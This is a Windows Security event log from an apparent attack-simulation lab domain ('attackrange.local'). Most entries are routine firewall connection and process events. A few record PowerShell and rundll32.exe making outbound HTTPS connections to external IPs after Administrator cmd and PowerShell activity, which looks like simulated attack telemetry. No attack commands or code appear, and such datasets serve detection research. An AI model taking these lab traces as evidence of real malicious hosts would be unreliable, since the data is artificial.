03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382231
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1c8c
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0x1
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382230
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2220
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x1
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382229
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		8736
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55128
	Destination Address:	185.199.110.133
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382228
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		8736
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55128
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382239
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59340
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382238
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55130
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382237
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55130
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382240
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60612
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382241
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60319
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382243
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55131
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382242
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55131
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382252
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61515
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382251
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		64227
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382250
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		64227
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382249
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64227
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382248
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64227
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382247
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60556
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382246
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382245
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382244
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382255
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		64227
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:53:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382254
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		64227
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382253
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382257
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55132
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382256
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55132
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382258
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59837
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:55 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382260
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2140
	Application Name:	\device\harddiskvolume1\windows\system32\rundll32.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55133
	Destination Address:	34.218.235.219
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:55 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382259
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2140
	Application Name:	\device\harddiskvolume1\windows\system32\rundll32.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55133
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382266
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55134
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382265
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55134
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382264
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59529
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382263
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382262
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382261
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:57 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382268
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60400
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:57 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382267
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:00 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382270
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61303
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:00 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382269
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61279
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382272
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		6484
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\bin\splunkd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55135
	Destination Address:	10.0.1.12
	Destination Port:		8089
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382271
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		6484
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\bin\splunkd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55135
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382274
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55136
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382273
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55136
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382286
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x2108
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe
	Exit Status:	0x1
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382285
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2108
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382284
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60625
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:05 PM
LogName=Security
